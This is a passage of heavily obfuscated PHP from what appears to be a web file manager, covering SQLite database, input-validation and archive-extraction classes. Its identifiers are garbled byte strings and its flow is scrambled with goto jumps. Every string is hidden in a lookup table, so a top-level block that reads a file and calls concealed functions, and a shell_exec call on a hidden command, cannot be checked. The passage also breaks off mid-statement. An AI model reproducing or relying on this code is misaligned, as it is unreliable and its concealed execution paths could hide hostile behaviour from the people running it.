$config; $this->values[$bÙ‹ÁÌ¶[17]] =& $in; goto F„«å‹±ì; b…“½ƒ¡Ş: } public function loadClass($eÕ·ŠÀ»ƒ¨) { if (1 === func_num_args()) { $this->{$eÕ·ŠÀ»ƒ¨} = new $eÕ·ŠÀ»ƒ¨(); } else { $Eãïá´Åöç = new ReflectionClass($eÕ·ŠÀ»ƒ¨); $A‹ğò³õÅ = func_get_args(); array_shift($A‹ğò³õÅ); $this->{$eÕ·ŠÀ»ƒ¨} = $Eãïá´Åöç->newInstanceArgs($A‹ğò³õÅ); } return $this->{$eÕ·ŠÀ»ƒ¨}; } protected function assign($b…ƒšÅÁùˆ, $cœ±¿òÂ±) { $this->values[$b…ƒšÅÁùˆ] = $cœ±¿òÂ±; } protected function display($eÁªªİ íõ) { ob_end_clean(); extract($this->values); require $this->tpl . $eÁªªİ íõ; } } class DbSqliteBase extends Db { public function __construct($EÉ“±¼†” = '') { $cÃµÙôƒˆŒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!extension_loaded($cÃµÙôƒˆŒ[19])) { think_exception(think_lang($cÃµÙôƒˆŒ[20]) . $cÃµÙôƒˆŒ[21]); } if (!empty($EÉ“±¼†”)) { if (!isset($EÉ“±¼†”[$cÃµÙôƒˆŒ[22]])) { $EÉ“±¼†”[$cÃµÙôƒˆŒ[22]] = 438; } $this->config = $EÉ“±¼†”; if (empty($this->config[$cÃµÙôƒˆŒ[23]])) { $this->config[$cÃµÙôƒˆŒ[23]] = array(); } } } public function connect($D¢óîùå—ø = '', $fíùñíÃ’ë = 0) { $aÖñ‚å¤óˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($this->linkID[$fíùñíÃ’ë])) { goto A«‰°Ô±Ö­; A«‰°Ô±Ö­: if (empty($D¢óîùå—ø)) { $D¢óîùå—ø = $this->config; } $eÖï±ùŠÙ† = !empty($D¢óîùå—ø[$aÖñ‚å¤óˆ[23]][$aÖñ‚å¤óˆ[24]]) ? $D¢óîùå—ø[$aÖñ‚å¤óˆ[23]][$aÖñ‚å¤óˆ[24]] : $this->pconnect; $Fçå…²ò„ = $eÖï±ùŠÙ† ? $aÖñ‚å¤óˆ[25] : $aÖñ‚å¤óˆ[26]; goto B–ã÷ç‡ º; a½÷ª÷Ñ‰ô: @sqlite_busy_timeout($this->linkID[$fíùñíÃ’ë], 30000); if (1 != think_config($aÖñ‚å¤óˆ[28])) { unset($this->config); } goto C•æ¯ì™ƒà; B–ã÷ç‡ º: $this->linkID[$fíùñíÃ’ë] = $Fçå…²ò„($D¢óîùå—ø[$aÖñ‚å¤óˆ[27]], $D¢óîùå—ø[$aÖñ‚å¤óˆ[22]]); if (!$this->linkID[$fíùñíÃ’ë]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto a½÷ª÷Ñ‰ô; C•æ¯ì™ƒà: } return $this->linkID[$fíùñíÃ’ë]; } public function free() { $this->queryID = null; } public function query($C³«ÚÃá) { goto f¼±×…ğê½; Aì¯î‘‰Õ¨: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Eë›É‡İ¤Š = $this->getAll(); return $Eë›É‡İ¤Š; } goto aÓÉï”áŒô; eÍàáö–ƒä: think_status($d‹Åº½¦œ[30]); $this->queryID = sqlite_query($this->_linkID, $C³«ÚÃá); $this->debug(); goto Aì¯î‘‰Õ¨; AéÑâŠ¥“: $this->queryStr = $C³«ÚÃá; if ($this->queryID) { $this->free(); } think_action_status($d‹Åº½¦œ[29], 1); goto eÍàáö–ƒä; f¼±×…ğê½: $d‹Åº½¦œ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AéÑâŠ¥“; aÓÉï”áŒô: } public function execute($A§ËßÏ±âç) { goto aº‹—©•ó; cå´Àß‹©±: if (!1 === $F¿ŸòïÎêÎ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto eø™¬„Øã÷; C²‹±â»‘‰: $this->queryStr = $A§ËßÏ±âç; if ($this->queryID) { $this->free(); } think_action_status($f½¤¶â°³¯[31], 1); goto fˆ¦ì¨Õˆ; fˆ¦ì¨Õˆ: think_status($f½¤¶â°³¯[30]); $F¿ŸòïÎêÎ = sqlite_exec($this->_linkID, $A§ËßÏ±âç); $this->debug(); goto cå´Àß‹©±; aº‹—©•ó: $f½¤¶â°³¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C²‹±â»‘‰; eø™¬„Øã÷: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹÷ˆ§éÒ°ú][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E õÄÓ†ğ = sqlite_query($this->_linkID, $_SERVER[¹÷ˆ§éÒ°ú][33]); if (!$E õÄÓ†ğ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BöÀœ‘‡³ = sqlite_query($this->_linkID, $_SERVER[¹÷ˆ§éÒ°ú][34]); if (!$BöÀœ‘‡³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Có…ˆ¹…°½ = array(); if ($this->numRows > 0) { for ($fÑ˜ˆâ­Ï = 0; $fÑ˜ˆâ­Ï < $this->numRows; $fÑ˜ˆâ­Ï++) { $Có…ˆ¹…°½[$fÑ˜ˆâ­Ï] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Có…ˆ¹…°½; } public function getFields($Cñù´¯Š¤) { $c÷Ôé‹Ëƒ¿ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÃ¸‚•äÂ— = $this->query($c÷Ôé‹Ëƒ¿[35] . $Cñù´¯Š¤ . $c÷Ôé‹Ëƒ¿[36]); $b¥ÔˆŒßŸ = array(); if ($aÃ¸‚•äÂ—) { foreach ($aÃ¸‚•äÂ— as $Eï¾¦Èˆ¿Á => $eÖğÑ³Áì) { $b¥ÔˆŒßŸ[$eÖğÑ³Áì[$c÷Ôé‹Ëƒ¿[37]]] = array($c÷Ôé‹Ëƒ¿[38] => $eÖğÑ³Áì[$c÷Ôé‹Ëƒ¿[37]], $c÷Ôé‹Ëƒ¿[39] => $eÖğÑ³Áì[$c÷Ôé‹Ëƒ¿[40]], $c÷Ôé‹Ëƒ¿[41] => (bool) ($eÖğÑ³Áì[$c÷Ôé‹Ëƒ¿[42]] === $c÷Ôé‹Ëƒ¿[43]), $c÷Ôé‹Ëƒ¿[44] => $eÖğÑ³Áì[$c÷Ôé‹Ëƒ¿[45]], $c÷Ôé‹Ëƒ¿[46] => strtolower($eÖğÑ³Áì[$c÷Ôé‹Ëƒ¿[47]]) == $c÷Ôé‹Ëƒ¿[48], $c÷Ôé‹Ëƒ¿[49] => strtolower($eÖğÑ³Áì[$c÷Ôé‹Ëƒ¿[50]]) == $c÷Ôé‹Ëƒ¿[51]); } } return $b¥ÔˆŒßŸ; } public function getTables($Bßï¸ãÀŠÀ = '') { $FÑªï¹§ï =& $_SERVER[¹÷ˆ§éÒ°ú]; $f‚›¾§äî = $this->query($FÑªï¹§ï[52] . $FÑªï¹§ï[53] . $FÑªï¹§ï[54]); $cĞŠí’ÈÇ = array(); foreach ($f‚›¾§äî as $AİÑ‚ØÁ… => $dÈâÍ©‚Ñ) { $cĞŠí’ÈÇ[$AİÑ‚ØÁ…] = current($dÈâÍ©‚Ñ); } return $cĞŠí’ÈÇ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $e¤ôŠî±í¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c˜œèì®À• = sqlite_last_error($this->_linkID); $this->error = $c˜œèì®À• . $e¤ôŠî±í¦[14] . sqlite_error_string($c˜œèì®À•); if ($e¤ôŠî±í¦[43] != $this->queryStr) { $this->error .= LNG($e¤ôŠî±í¦[55]) . $this->queryStr; } think_trace($this->error, $e¤ôŠî±í¦[43], $e¤ôŠî±í¦[56]); return $this->error; } public function escapeString($a·˜ñàÁèÏ) { return sqlite_escape_string($a·˜ñàÁèÏ); } public function parseLimit($C¼Ô¾·œ»ç) { $bĞç¾¾¦§İ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a‚§ÏŸ­‚à = $bĞç¾¾¦§İ[43]; if (!empty($C¼Ô¾·œ»ç)) { $C¼Ô¾·œ»ç = explode($bĞç¾¾¦§İ[57], $C¼Ô¾·œ»ç); if (count($C¼Ô¾·œ»ç) > 1) { $a‚§ÏŸ­‚à .= $bĞç¾¾¦§İ[58] . $C¼Ô¾·œ»ç[1] . $bĞç¾¾¦§İ[59] . $C¼Ô¾·œ»ç[0] . $bĞç¾¾¦§İ[60]; } else { $a‚§ÏŸ­‚à .= $bĞç¾¾¦§İ[58] . $C¼Ô¾·œ»ç[0] . $bĞç¾¾¦§İ[60]; } } return $a‚§ÏŸ­‚à; } } if ($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][6]] != $_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][61]]) { goto F‹Ï¿¢ãÒ¡; Dî·ø¿ğ¸õ: $B×öéèŞà = explode($_SERVER[¹÷ˆ§éÒ°ú][10], $e¬îæ‘®“Ø); if (count($B×öéèŞà) < $_SERVER[¹÷ˆ§éÒ°ú][11]) { $D«¤òÏœ‚å = $_SERVER[¹÷ˆ§éÒ°ú][12]; $D«¤òÏœ‚å(); } $BÔìË¬öÈâ = $_SERVER[¹÷ˆ§éÒ°ú][13]; goto D¹‡¨®­³´; F‹Ï¿¢ãÒ¡: $D‚¤’Ôê²Š = $_SERVER[¹÷ˆ§éÒ°ú][7]; $Dî˜Õ‘Ì¼Ğ = $_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][8]] . $_SERVER[¹÷ˆ§éÒ°ú][9]; $e¬îæ‘®“Ø = $D‚¤’Ôê²Š($Dî˜Õ‘Ì¼Ğ); goto Dî·ø¿ğ¸õ; D¹‡¨®­³´: $BÔìË¬öÈâ($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][62]]); goto E¥áÙÆÂ¤; E¥áÙÆÂ¤: } goto DàåÒŸ¬ÕŞ; fòêã×¿˜ô: class Input { public static function getArray($Dãª…—àÇ²) { goto B˜ƒÔÎÒ²¾; B˜ƒÔÎÒ²¾: $c¢ëì’‘Ó„ =& $_SERVER[¹÷ˆ§éÒ°ú]; global $in; $e‹İ á§À‘ = array(); goto A´¹Ì¹¡»Ó; dô†©±»¡è: if (count($B½ÛÆÓÙ†) > 0) { show_json(implode($c¢ëì’‘Ó„[1874], $B½ÛÆÓÙ†), !1); } return $e‹İ á§À‘; goto fªš­Õ›½; A´¹Ì¹¡»Ó: $B½ÛÆÓÙ† = array(); $F§”ĞÌ®… = LNG($c¢ëì’‘Ó„[1870]); foreach ($Dãª…—àÇ² as $bä÷Ï‹ˆé  => $EÎÏâêšõ’) { goto BÄ¡‰Ô‹‘; Aäóš¬¸Ú: if (!array_key_exists($bä÷Ï‹ˆé , $in)) { if (array_key_exists($c¢ëì’‘Ó„[1872], $EÎÏâêšõ’)) { if (!is_null($EÎÏâêšõ’[$c¢ëì’‘Ó„[1872]])) { $e‹İ á§À‘[$Aó©•Œˆœ] = $EÎÏâêšõ’[$c¢ëì’‘Ó„[1872]]; } } else { if (isset($EÎÏâêšõ’[$c¢ëì’‘Ó„[1873]])) { $B½ÛÆÓÙ†[] = $F¦÷¦¶ÆÆ; } } continue; } if (isset($EÎÏâêšõ’[$c¢ëì’‘Ó„[1873]]) && $EÎÏâêšõ’[$c¢ëì’‘Ó„[1873]] == $c¢ëì’‘Ó„[293]) { $e¶¡Ô›ª†İ = json_decode($in[$bä÷Ï‹ˆé ], !0); if (is_array($e¶¡Ô›ª†İ)) { $e‹İ á§À‘[$Aó©•Œˆœ] = $e¶¡Ô›ª†İ; } else { if (array_key_exists($c¢ëì’‘Ó„[1872], $EÎÏâêšõ’)) { if (!is_null($EÎÏâêšõ’[$c¢ëì’‘Ó„[1872]])) { $e‹İ á§À‘[$Aó©•Œˆœ] = $EÎÏâêšõ’[$c¢ëì’‘Ó„[1872]]; } } else { $B½ÛÆÓÙ†[] = $F¦÷¦¶ÆÆ; } } continue; } $A‡æİè­Û² = _get($EÎÏâêšõ’, $c¢ëì’‘Ó„[1003]); goto eŒÈ‹—Ì‰; BÄ¡‰Ô‹‘: $F¦÷¦¶ÆÆ = _get($EÎÏâêšõ’, $c¢ëì’‘Ó„[1237], $F§”ĞÌ®… . $c¢ëì’‘Ó„[870] . $bä÷Ï‹ˆé ); $Aó©•Œˆœ = $bä÷Ï‹ˆé ; if (isset($EÎÏâêšõ’[$c¢ëì’‘Ó„[1871]]) && $EÎÏâêšõ’[$c¢ëì’‘Ó„[1871]]) { $Aó©•Œˆœ = $EÎÏâêšõ’[$c¢ëì’‘Ó„[1871]]; } goto Aäóš¬¸Ú; eŒÈ‹—Ì‰: if (isset($EÎÏâêšõ’[$c¢ëì’‘Ó„[1873]]) && !self::check($in[$bä÷Ï‹ˆé ], $EÎÏâêšõ’[$c¢ëì’‘Ó„[1873]], $A‡æİè­Û²)) { if (array_key_exists($c¢ëì’‘Ó„[1872], $EÎÏâêšõ’)) { if (!is_null($EÎÏâêšõ’[$c¢ëì’‘Ó„[1872]])) { $e‹İ á§À‘[$Aó©•Œˆœ] = $EÎÏâêšõ’[$c¢ëì’‘Ó„[1872]]; } } else { $B½ÛÆÓÙ†[] = $F¦÷¦¶ÆÆ; } continue; } $e‹İ á§À‘[$Aó©•Œˆœ] = $in[$bä÷Ï‹ˆé ]; goto D”ˆ…î¤Ç‚; D”ˆ…î¤Ç‚: } goto dô†©±»¡è; fªš­Õ›½: } public static function reg($eêîª¸ø„× = "\x72\x65\x71\165\151\162\x65") { static $a˜Éáó„¬ = array("\x72\x65\x71\x75\151\x72\x65" => "\56\x2b", "\x6e\165\x6d\x62\x65\162" => "\x5c\x64\x2b", "\x69\x6e\x74\x65\147\x65\x72" => "\134\144\x2b", "\x68\145\170" => "\x5b\60\x2d\71\101\55\106\141\55\146\135\x2b", "\x69\156\x74" => "\133\x2d\x5c\x2b\135\77\134\144\x2b", "\142\157\x6f\x6c" => "\60\174\61", "\x66\x6c\157\141\164" => "\x5b\x2d\x5c\x2b\x5d\x3f\x5c\144\53\x28\134\x2e\x5c\144\53\51\77", "\145\x6e\147\154\x69\x73\150" => "\x5b\101\55\x5a\x61\55\172\x20\x5d\x2b", "\x63\x68\151\x6e\145\163\x65" => "\133\x5c\x78\x7b\x34\x65\60\x30\175\55\x5c\170\173\71\x66\x61\x35\x7d\135\53", "\x68\141\x73\x43\x68\x69\x6e\x65\163\145" => "\57\50\x5b\134\170\x7b\x34\145\60\x30\x7d\x2d\x5c\x78\x7b\x39\x66\141\x35\x7d\135\x2b\x29\x2f\x75", "\145\x6d\141\151\x6c" => "\x5c\x77\x2b\x28\x5b\134\56\x5c\55\135\x5c\x77\53\x29\52\134\x40\x5c\x77\53\50\x5b\x5c\56\x5c\55\135\134\167\x2b\51\52\134\56\x5c\167\x2b", "\160\150\157\156\145" => "\61\133\x33\x2d\x39\135\x5c\144\173\x39\175", "\164\145\x6c\x70\150\157\x6e\x65" => "\50\x5c\50\134\x64\173\x33\54\64\175\134\x29\174\134\144\x7b\63\x2c\x34\x7d\55\174\x5c\x73\51\77\x5c\144\173\x37\x2c\61\64\175", "\165\x72\x6c" => "\50\x68\x74\164\160\x7c\146\164\x70\174\x68\x74\164\x70\x73\51\72\134\x2f\134\57\133\x5c\x77\x5c\55\137\135\53\x28\134\x2e\133\134\167\134\55\x5f\135\53\x29\x2b\x28\x5b\134\x77\134\x2d\134\x2e\x2c\100\x3f\136\75\45\x26\x3a\x5c\57\176\x5c\53\43\x5d\52\133\134\x77\x5c\55\x5c\x40\x3f\136\x3d\45\46\x5c\x2f\176\134\53\43\x5d\51\x3f", "\x75\x72\154\x46\x75\x6c\154" => "\133\141\x2d\x7a\x41\55\172\x5d\x2b\x3a\134\57\x5c\x2f\x5b\136\134\x73\x5d\x2a", "\x69\x70" => "\50\134\x64\x7b\61\x2c\63\x7d\134\56\x29\x7b\x33\x7d\x28\134\144\x7b\61\x2c\x33\175\x29", "\172\x69\160" => "\x5b\61\55\x39\135\134\x64\x7b\x35\x7d\50\77\x21\x5c\x64\51", "\x69\144\103\x61\x72\144" => "\50\134\144\173\x31\x35\x7d\x29\174\x28\134\144\x7b\61\x37\x7d\x28\x5c\144\x7c\x58\174\170\x29\x29", "\143\157\x6c\157\162" => "\43\50\x5b\x30\55\71\101\55\x46\141\55\146\x5d\x7b\63\175\x7c\x5b\60\x2d\71\x41\55\x46\141\x2d\x66\x5d\173\66\175\x29", "\x74\151\x6d\x65" => "\50\133\60\55\x31\x5d\x5c\x64\174\62\133\60\x2d\64\135\51\x3a\x5b\x30\55\65\x5d\x5c\144", "\144\141\164\x65" => "\134\x64\x7b\x34\175\133\x2d\134\x2f\135\x3f\x28\x30\133\61\55\x39\x5d\x7c\61\133\60\x2d\62\135\51\133\55\x5c\57\135\77\x28\x5b\60\x2d\x32\135\134\x64\x7c\63\x5b\x30\x2d\x31\135\x29", "\x64\141\164\145\124\151\x6d\145" => "\134\x64\173\64\175\133\55\134\x2f\135\77\x28\60\133\x31\x2d\71\x5d\x7c\61\x5b\x30\55\62\x5d\x29\x5b\55\134\x2f\x5d\x3f\x28\133\x30\55\62\135\134\x64\x7c\x33\133\60\55\x31\x5d\x29\134\x73\x2b\x28\133\60\55\61\x5d\x5c\x64\174\62\133\60\x2d\x34\135\x29\72\x5b\60\55\x35\135\x5c\x64", "\160\141\163\x73\167\157\x72\x64" => "\50\77\x3d\56\x2a\134\x64\x29\50\x3f\75\56\x2a\133\141\x2d\x7a\135\x29\50\x3f\75\x2e\x2a\x5b\x41\x2d\132\135\51\56\173\70\54\62\60\x7d", "\153\145\x79" => "\x5b\101\x2d\x5a\141\55\x7a\60\x2d\x39\137\x5c\55\134\56\x5d\53", "\x6b\x65\171\x46\165\x6c\x6c" => "\x5b\101\55\x5a\x61\55\x7a\60\x2d\x39\x5f\134\x2d\134\x2e\x5c\163\54\x5d\53"); if (!$eêîª¸ø„×) { return $a˜Éáó„¬; } return $a˜Éáó„¬[$eêîª¸ø„×]; } public static function check($eáÅ¾éïò, $d·ˆ˜³„‰», $AÙ£ï›…’« = null) { $B•â·¡½¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; switch ($d·ˆ˜³„‰») { case $B•â·¡½¡[17]: return in_array($eáÅ¾éïò, $AÙ£ï›…’«); break; case $B•â·¡½¡[1875]: return floatval($eáÅ¾éïò) > $AÙ£ï›…’«; break; case $B•â·¡½¡[1876]: return floatval($eáÅ¾éïò) < $AÙ£ï›…’«; break; case $B•â·¡½¡[336]: return strlen($eáÅ¾éïò) >= $AÙ£ï›…’«[0] && strlen($eáÅ¾éïò) <= $AÙ£ï›…’«[1]; break; case $B•â·¡½¡[336]: if (is_array($AÙ£ï›…’«)) { return strlen($eáÅ¾éïò) >= $AÙ£ï›…’«[0] && strlen($eáÅ¾éïò) <= $AÙ£ï›…’«[1]; break; } else { return strlen($eáÅ¾éïò) == $AÙ£ï›…’«; break; } case $B•â·¡½¡[332]: return floatval($eáÅ¾éïò) >= $AÙ£ï›…’«[0] && floatval($eáÅ¾éïò) <= $AÙ£ï›…’«[1]; break; } $bºËª§ëîØ = self::reg(!1); $d·ˆ˜³„‰» = isset($bºËª§ëîØ[$d·ˆ˜³„‰»]) ? $bºËª§ëîØ[$d·ˆ˜³„‰»] : $d·ˆ˜³„‰»; if (substr($d·ˆ˜³„‰», 0, 1) != $B•â·¡½¡[18]) { $d·ˆ˜³„‰» = $B•â·¡½¡[1877] . $d·ˆ˜³„‰» . $B•â·¡½¡[1878]; } return preg_match($d·ˆ˜³„‰», $eáÅ¾éïò) === 1; } public static function get($dŸàğ…ØÔÔ, $C¤àÃ¬Ãâ… = null, $eó¨İ¼ãÚ = null, $D§¥’—…ó¹ = null) { goto d·Á»ëöãˆ; d·Á»ëöãˆ: $C¥ÍÅØÛ… =& $_SERVER[¹÷ˆ§éÒ°ú]; $D¦ áÇÉ±  = array(); if (!is_null($eó¨İ¼ãÚ)) { $D¦ áÇÉ± [$C¥ÍÅØÛ…[44]] = $eó¨İ¼ãÚ; } goto B¿†¹Øîç; aÎ‘º»ö– : return $bÄÎî‰ìİ×[$dŸàğ…ØÔÔ]; goto FÌ¨åÆšÇ; B¿†¹Øîç: if (!is_null($D§¥’—…ó¹)) { $D¦ áÇÉ± [$C¥ÍÅØÛ…[1003]] = $D§¥’—…ó¹; } if (!is_null($C¤àÃ¬Ãâ…)) { $D¦ áÇÉ± [$C¥ÍÅØÛ…[1873]] = $C¤àÃ¬Ãâ…; } $bÄÎî‰ìİ× = Input::getArray(array($dŸàğ…ØÔÔ => $D¦ áÇÉ± )); goto aÎ‘º»ö– ; FÌ¨åÆšÇ: } } class KodArchive { static function init() { goto bÈ¬ö±«¯×; F™ï’õÍ¥²: require_once ARCHIVE_LIB . $E§«—ÖğÉµ[1887]; require_once ARCHIVE_LIB . $E§«—ÖğÉµ[1888]; require_once ARCHIVE_LIB . $E§«—ÖğÉµ[1889]; goto CŸÚ®¡¤¼; A«­Á•¢…: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $E§«—ÖğÉµ[1885]; require_once ARCHIVE_LIB . $E§«—ÖğÉµ[1886]; goto F™ï’õÍ¥²; bÈ¬ö±«¯×: $E§«—ÖğÉµ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (defined($E§«—ÖğÉµ[1879])) { return; } define($E§«—ÖğÉµ[1879], SDK_DIR . $E§«—ÖğÉµ[1880]); goto C—é¬Í½¥Í; CŸÚ®¡¤¼: require_once ARCHIVE_LIB . $E§«—ÖğÉµ[1890]; goto eğñù‚ÅÈ ; C—é¬Í½¥Í: define($E§«—ÖğÉµ[1881], TEMP_FILES); define($E§«—ÖğÉµ[1882], TEMP_FILES); define($E§«—ÖğÉµ[1883], $E§«—ÖğÉµ[1884]); goto A«­Á•¢…; eğñù‚ÅÈ : } static function checkIfType($Aµ™Ô““Ëç, $FùÄøç»Øƒ) { goto Aâ™ÖÅ´¶; Aâ™ÖÅ´¶: $F¯åØ¿âñ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::init(); $F…ªŞà¸Çğ = array($F¯åØ¿âñ[312] => array($F¯åØ¿âñ[312], $F¯åØ¿âñ[1891], $F¯åØ¿âñ[1892], $F¯åØ¿âñ[1893]), $F¯åØ¿âñ[1894] => array($F¯åØ¿âñ[1894], $F¯åØ¿âñ[1895], $F¯åØ¿âñ[1034], $F¯åØ¿âñ[1032]), $F¯åØ¿âñ[1036] => array($F¯åØ¿âñ[1036], $F¯åØ¿âñ[1896], $F¯åØ¿âñ[1897], $F¯åØ¿âñ[1898], $F¯åØ¿âñ[1899], $F¯åØ¿âñ[1900], $F¯åØ¿âñ[1901])); goto c¿†éˆƒ—³; CòË³×ÚŒ: return $e¯Õ‹İ°; goto c˜ºÏ•¾; c¿†éˆƒ—³: $e¯Õ‹İ° = in_array($Aµ™Ô““Ëç, $F…ªŞà¸Çğ[$FùÄøç»Øƒ]); if ($e¯Õ‹İ° && ($FùÄøç»Øƒ == $F¯åØ¿âñ[312] || $FùÄøç»Øƒ == $F¯åØ¿âñ[1894]) && (!function_exists($F¯åØ¿âñ[1902]) || !function_exists($F¯åØ¿âñ[1903]))) { show_tips($F¯åØ¿âñ[1904]); } if ($e¯Õ‹İ° && $FùÄøç»Øƒ == $F¯åØ¿âñ[1036] && (!function_exists($F¯åØ¿âñ[1905]) || !strstr(shell_exec($F¯åØ¿âñ[1906]), $F¯åØ¿âñ[1907]))) { show_tips($F¯åØ¿âñ[1908]); } goto CòË³×ÚŒ; c˜ºÏ•¾: } static function listContent($A®àŞŞ‡íõ, $dŠÖÔÑÂŞ = true) { $EŠƒìÆÁ­ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::init(); $b«Í—ÜÑ½Â = !empty($GLOBALS[$EŠƒìÆÁ­[1040]]) ? $GLOBALS[$EŠƒìÆÁ­[1040]] : get_path_ext($A®àŞŞ‡íõ); $bÚ‡ñ´Û = !1; if (self::checkIfType($b«Í—ÜÑ½Â, $EŠƒìÆÁ­[1894])) { $AØ—„¸Ê = PclTarList($A®àŞŞ‡íõ, $b«Í—ÜÑ½Â); $bÚ‡ñ´Û = array(); for ($AŠÛììÆ¥ = 0; $AŠÛììÆ¥ < count($AØ—„¸Ê); $AŠÛììÆ¥++) { $cŞ†Â·Æ·º = $AØ—„¸Ê[$AŠÛììÆ¥]; if ($cŞ†Â·Æ·º[$EŠƒìÆÁ­[1909]] == $EŠƒìÆÁ­[1910] || $cŞ†Â·Æ·º[$EŠƒìÆÁ­[1909]] == $EŠƒìÆÁ­[1911]) { continue; } if ($dŠÖÔÑÂŞ) { $cŞ†Â·Æ·º[$EŠƒìÆÁ­[1912]] = ltrim($cŞ†Â·Æ·º[$EŠƒìÆÁ­[1912]], $EŠƒìÆÁ­[1146]); } if ($cŞ†Â·Æ·º[$EŠƒìÆÁ­[1909]] == $EŠƒìÆÁ­[1913]) { $cŞ†Â·Æ·º[$EŠƒìÆÁ­[88]] = !0; } else { $cŞ†Â·Æ·º[$EŠƒìÆÁ­[88]] = !1; } $cŞ†Â·Æ·º[$EŠƒìÆÁ­[1027]] = $AŠÛììÆ¥; $bÚ‡ñ´Û[] = $cŞ†Â·Æ·º; } } else { if (self::checkIfType($b«Í—ÜÑ½Â, $EŠƒìÆÁ­[1036])) { $E½Ó¾¼ÂŒñ = kodRarArchive::listContent($A®àŞŞ‡íõ); if (!$E½Ó¾¼ÂŒñ[$EŠƒìÆÁ­[1023]]) { return $E½Ó¾¼ÂŒñ; } else { $bÚ‡ñ´Û = $E½Ó¾¼ÂŒñ[$EŠƒìÆÁ­[1025]]; } } else { if (kodZipArchive::support($EŠƒìÆÁ­[365])) { $bÚ‡ñ´Û = kodZipArchive::listContent($A®àŞŞ‡íõ); } else { $D©­Ø«‡œÅ = new PclZip($A®àŞŞ‡íõ); $bÚ‡ñ´Û = $D©­Ø«‡œÅ->listContent(); } } } if ($bÚ‡ñ´Û) { $AŸ•Á×ğù¯ = unzip_charset_get($bÚ‡ñ´Û); $dŠÖÔÑÂŞ = $dŠÖÔÑÂŞ && function_exists($EŠƒìÆÁ­[77]); for ($AŠÛììÆ¥ = 0; $AŠÛììÆ¥ < count($bÚ‡ñ´Û); $AŠÛììÆ¥++) { $bÚ‡ñ´Û[$AŠÛììÆ¥][$EŠƒìÆÁ­[1912]] = str_replace(array($EŠƒìÆÁ­[1063], $EŠƒìÆÁ­[1914]), $EŠƒìÆÁ­[758], $bÚ‡ñ´Û[$AŠÛììÆ¥][$EŠƒìÆÁ­[1912]]); if ($dŠÖÔÑÂŞ) { $bÚ‡ñ´Û[$AŠÛììÆ¥][$EŠƒìÆÁ­[1912]] = iconv_to($bÚ‡ñ´Û[$AŠÛììÆ¥][$EŠƒìÆÁ­[1912]], $AŸ•Á×ğù¯, $EŠƒìÆÁ­[337]); unset($bÚ‡ñ´Û[$AŠÛììÆ¥][$EŠƒìÆÁ­[1915]]); } } return array($EŠƒìÆÁ­[1023] => !0, $EŠƒìÆÁ­[1025] => $bÚ‡ñ´Û); } else { return array($EŠƒìÆÁ­[1023] => !1, $EŠƒìÆÁ­[1025] => $bÚ‡ñ´Û); } } static function extract($CÉùÒ“Ê¿Ğ, $càˆê½ˆä, $AÇ•Û¬ó¯ = "\x2d\x31", &$A¦’Í¾¤‰ = false) { goto F„¤Ø ‚‚Ã; F„¤Ø ‚‚Ã: $d¡ç‹¸¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; self::init(); $D·²°ÉË… = !empty($GLOBALS[$d¡ç‹¸¡[1040]]) ? $GLOBALS[$d¡ç‹¸¡[1040]] : get_path_ext($CÉùÒ“Ê¿Ğ); goto fÍ‚à¬š¡Ò; fÄˆÔŠÜâ®: if (self::checkIfType($D·²°ÉË…, $d¡ç‹¸¡[1894])) { if ($AÇ•Û¬ó¯ != $d¡ç‹¸¡[1022]) { $a›ÆÑÙÛ§Ã = unzip_pre_name($a›ÆÑÙÛ§Ã); $AÒ¬¸Íí… = unzip_pre_name($AÒ¬¸Íí…); $CÜÀ‹µâç­ = PclTarExtractList($CÉùÒ“Ê¿Ğ, array($a›ÆÑÙÛ§Ã), $càˆê½ˆä, $AÒ¬¸Íí…, $D·²°ÉË…); } else { $CÜÀ‹µâç­ = PclTarExtract($CÉùÒ“Ê¿Ğ, $càˆê½ˆä, $d¡ç‹¸¡[372], $D·²°ÉË…); } return array($d¡ç‹¸¡[1023] => $CÜÀ‹µâç­, $d¡ç‹¸¡[1025] => PclErrorString(!0)); } else { if (self::checkIfType($D·²°ÉË…, $d¡ç‹¸¡[1036])) { return kodRarArchive::extract($CÉùÒ“Ê¿Ğ, $càˆê½ˆä, $D·²°ÉË…, $A¦’Í¾¤‰); } else { if (kodZipArchive::support($d¡ç‹¸¡[1916])) { return kodZipArchive::extract($CÉùÒ“Ê¿Ğ, $càˆê½ˆä, $A¦’Í¾¤‰); } else { $D¢ØÅ´½‰ƒ = new PclZip($CÉùÒ“Ê¿Ğ); if ($AÇ•Û¬ó¯ != $d¡ç‹¸¡[1022]) { $CÜÀ‹µâç­ = $D¢ØÅ´½‰ƒ->extract(PCLZIP_OPT_PATH, $càˆê½ˆä, PCLZIP_OPT_SET_CHMOD, 